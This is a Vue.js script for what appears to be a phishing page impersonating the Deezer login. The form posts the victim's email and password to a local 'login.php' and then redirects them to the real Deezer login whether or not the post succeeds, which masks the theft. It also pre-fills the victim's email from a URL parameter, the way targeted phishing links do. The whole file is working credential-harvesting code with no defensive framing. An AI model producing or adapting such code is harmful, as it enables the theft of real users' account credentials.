<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      mobileMenuOpen: false,
      mobileBottom1Open: false,
      mobileBottom2Open: false,
      mobileBottom3Open: false,
      mobileBottom4Open: false,
      emailaddress: '',
      password: '',
      progressActive: false,
      referrerPage: "//www.deezer.com/nl/login",
      submitError: false
    }
  },
  methods: {
    toggleMobileMenu () {
      let t = this
      t.mobileMenuOpen = !t.mobileMenuOpen
      if (t.mobileMenuOpen) {
        document.body.classList.add('disabled-scroll');
      } else {
        document.body.classList.remove('disabled-scroll');
      }
    },
    isValidEmail (email) {
      const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
      return re.test(String(email).toLowerCase())
    },
    submitForm () {
      let vm = this
      vm.submitError = vm.password.length < 8 || !vm.isValidEmail(vm.emailaddress)
      if (!vm.submitError) {
        axios.post('login.php', {email: vm.emailaddress, password: vm.password})
        .then(res => {
          window.location.replace(vm.referrerPage);
        })
        .catch(error => {
          window.location.replace(vm.referrerPage);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  computed: {
    dateYear () {
      return new Date().getFullYear()
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

